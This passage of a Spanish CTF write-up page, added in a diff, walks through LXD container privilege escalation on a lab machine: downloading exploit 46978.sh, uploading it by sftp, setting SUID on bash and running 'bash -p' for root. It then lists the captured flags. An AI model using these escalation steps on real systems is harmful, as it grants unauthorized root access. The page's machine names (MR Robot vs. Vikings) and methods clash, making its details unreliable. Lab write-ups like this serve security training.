+      <p>El archivo <strong>46978.sh</strong> se encargará de automatizar todo el proceso de creación del contenedor y el montaje del sistema de archivo del host dentro del mismo.</p>
+      <p>Con el comando <strong>searchsploit -m linux/local/46978.sh</strong> descargaremos el archivo a nuestra máquina Kali Linux.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> searchsploit -m linux/local/46978.sh
+      </div>
+      <p>Dentro del archivo podemos ver los pasos que debemos seguir.</p>
+      <figure>
+        <img src="imagenes/image33.png" alt="Contenido de 46978.sh" />
+        <figcaption>Contenido de 46978.sh</figcaption>
+      </figure>
+      <p>Lo primero que haremos será descargar una imagen de contenedor con</p>
+      <figure>
+        <img src="imagenes/image34.png" alt="Descarga de imagen Alpine" />
+        <figcaption>Descarga de imagen Alpine</figcaption>
+      </figure>
+      <p>Con bash build-alpine creamos un archivo comprimido, ya que para ejecutar el archivo sh debemos pasarle un archivo de estas características.</p>
+      <p>Después de ejecutarlo debemos tener un archivo de este estilo</p>
+      <figure>
+        <img src="imagenes/image35.png" alt="Archivo alpine.tar.gz" />
+        <figcaption>Archivo alpine.tar.gz</figcaption>
+      </figure>
+      <p>Ahora debemos meter tanto el archivo 46978.sh como el archivo tar.gz dentro de la máquina víctima.Para ello, abriremos una sesión sftp y subiremos los archivos.</p>
+      <figure>
+        <img src="imagenes/image36.png" alt="Subida de archivos por sftp" />
+        <figcaption>Subida de archivos por sftp</figcaption>
+      </figure>
+      <p>Como podemos ver, los archivos ya se encuentran dentro de la máquina.</p>
+      <figure>
+        <img src="imagenes/image37.png" alt="Archivos en la máquina víctima" />
+        <figcaption>Archivos en la máquina víctima</figcaption>
+      </figure>
+      <p>Ahora debemos ejecutarlo, y se creará el contenedor.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> bash 46978.sh alpine.tar.gz
+      </div>
+      <figure>
+        <img src="imagenes/image38.png" alt="Ejecución de 46978.sh" />
+        <figcaption>Ejecución de 46978.sh</figcaption>
+      </figure>
+      <p>Dentro del contenedor debemos ir a la ruta /mnt/root y con chmod u+s bin/bash darle a la terminal el bit SUID para convertirnos en root cuando la ejecutemos.</p>
+      <figure>
+        <img src="imagenes/image39.png" alt="Concesión de SUID a bash dentro del contenedor" />
+        <figcaption>Concesión de SUID a bash dentro del contenedor</figcaption>
+      </figure>
+      <p>Ahora salimos del contenedor con exit y ejecutamos bash -p y whoami para ver que al ejecutar la terminal ya somos root y , de esta manera,podemos acceder al archivo root.txt.</p>
+      <figure>
+        <img src="imagenes/image40.png" alt="Escalada por LXD" />
+        <figcaption>Escalada por LXD</figcaption>
+      </figure>
+
+      <!-- 5. Resultados -->
+      <h3 id="resultados">5.- Resultados obtenidos</h3>
+      <div class="table-wrap">
+        <table>
+          <thead></thead>
+          <tbody>
+            <tr><td><strong>Key 1 -> user.txt</strong></td><td>4bf930187d0149a9e4374a4e823f867d</td></tr>
+            <tr><td><strong>Key 2 -> root.txt</strong></td><td>f0b98d4387ff6da77317e582da98bf31</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Herramientas utilizadas:</h3>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th><strong>Herramienta</strong></th><th><strong>Uso</strong></th></tr></thead>
+          <tbody>
+            <tr><td>Nmap</td><td>Descubrimiento de hosts y escaneo de puertos</td></tr>
+            <tr><td>Gobuster</td><td>Fuzzing de directorios web</td></tr>
+            <tr><td>WPScan</td><td>Ataque de fuerza bruta a WordPress</td></tr>
+            <tr><td>netcat (nc)</td><td>Establecimiento de reverse shell</td></tr>
+            <tr><td>find</td><td>Búsqueda de binarios SUID</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Conclusión</h3>
+      <p>La resolución de la máquina MR Robot me ha permitido poner en práctica técnicas fundamentales de ciberseguridad ofensiva:</p>
+      <ul>
+        <li>Enumeración web para descubrir recursos ocultos ('robots.txt', 'fsocity.dic')</li>
+        <li>Ataque de fuerza bruta con WPScan para obtener credenciales</li>
+        <li>Reverse Shell mediante inyección de código PHP en WordPress</li>
+        <li>Escalada de privilegios aprovechando binarios SUID vulnerables (nmap 3.81)</li>
+      </ul>
+
+      <!-- Botón de volver al portfolio -->
+      <div style="margin-top:30px; text-align:center;">
+        <a href="../../index.html#proyectos" class="btn-back">← Volver al portfolio</a>
+      </div>
+
+    </section>
+
+    <footer>
+      © 2026 Jose L. Trigo · Ethical Hacker · Write‑up del CTF Vikings
+    </footer>
+
+  </div> <!-- /wrap -->
+
+</body>
+</html>
